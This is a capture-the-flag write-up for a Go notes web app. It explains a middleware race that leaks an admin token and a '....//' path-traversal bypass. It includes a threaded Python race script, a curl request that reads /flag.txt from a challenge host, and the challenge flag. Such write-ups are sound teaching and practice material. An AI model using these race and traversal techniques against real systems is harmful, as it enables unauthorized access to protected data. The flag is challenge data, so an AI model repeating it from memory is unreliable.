## TL;DR
The app uses a custom router that builds its middleware chain in a racy way. By hammering a public endpoint at the same time as `/admin/login-token`, the localhost-only check can be skipped and the token gets appended to the public response. With that token, the admin note reader can be abused to traverse directories (via a `....//` trick) and read `/flag.txt`.

---

## Source Review
Key files:
- `src/models/router.go` – custom router + middleware handling
- `src/routes.go` – route setup, including `/admin/login-token`
- `src/controllers/note_controller.go` – note read/write logic
- `src/models/auth.go` – token is HMAC(password, secret)

### Important observations
1. **Token is not guessable**
   - `GenerateAuthToken()` is HMAC‑SHA256 of the admin password.
   - The password and secret are random at startup (`entrypoint.sh`).

2. **`/admin/login-token` exists**
   - It returns the token directly but is protected by `LocalHostOnly`.

3. **Middleware chain is racy**
   - In `router.go`, the middleware slice is reused and appended to per-request without making a copy. Under concurrent load, route-specific middleware can “bleed” between requests.

4. **Admin note read sanitization is weak**
   - `ReadNote()` does `strings.ReplaceAll(noteID, "../", "")`.
   - This can be bypassed with `....//` which becomes `../` after the replacement.

---

## Vulnerability 1: Middleware Race (Dead Route)
`router.go` builds the handler chain like this (simplified):

```
mws := r.mws
for _, h := range handlers {
    mws = append(mws, getMWFromHandler(h))
}
```

Because `mws` points to the same backing array as `r.mws`, concurrent requests can mutate the shared slice. The effect: sometimes a public request (`/notes`) ends up running the `/admin/login-token` handler without `LocalHostOnly` being enforced. The response then becomes:

```
<notes JSON><64-hex token>
```

---

## Vulnerability 2: Directory Traversal via `....//`
Admin read does:

```
noteID = strings.ReplaceAll(noteID, "../", "")
filePath := filepath.Join("notes", noteID)
```

If we pass `....//flag.txt`, the replacement yields `../flag.txt` and `filepath.Join` resolves out of `notes/` to `/flag.txt`.

---

## Exploit Steps

### 1) Leak the admin token with a simple race

```python
import threading
import time
import re
import urllib.request

BASE = "http://154.57.164.82:32565"

TOKEN_RE = re.compile(rb"[0-9a-f]{64}")
found = None
stop = False


def hit_notes():
    while not stop:
        try:
            urllib.request.urlopen(BASE + "/notes", timeout=2).read()
        except Exception:
            pass


def hit_token():
    global found, stop
    while not stop:
        try:
            data = urllib.request.urlopen(BASE + "/admin/login-token", timeout=2).read()
            if b"Forbidden" in data:
                continue
            m = TOKEN_RE.search(data)
            if m:
                found = m.group(0).decode()
                stop = True
        except Exception:
            pass


# spin up a few workers
threads = []
for _ in range(25):
    t = threading.Thread(target=hit_notes, daemon=True)
    t.start()
    threads.append(t)

for _ in range(8):
    t = threading.Thread(target=hit_token, daemon=True)
    t.start()
    threads.append(t)

# wait a little while
start = time.time()
while time.time() - start < 15 and not stop:
    time.sleep(0.1)

print("token:", found)
```


### 2) Use the token to read `/flag.txt`

```bash
curl -s --cookie "santa_auth=<TOKEN>" \
  "http://154.57.164.82:32565/admin/notes/read?id=....//....//flag.txt"
```

---

## Flag
```
HTB{f1nd_th3_d34d_r0ute_after_w1nning_the_rac3_d4f199406ee0fdadea3f44856848adab}
```

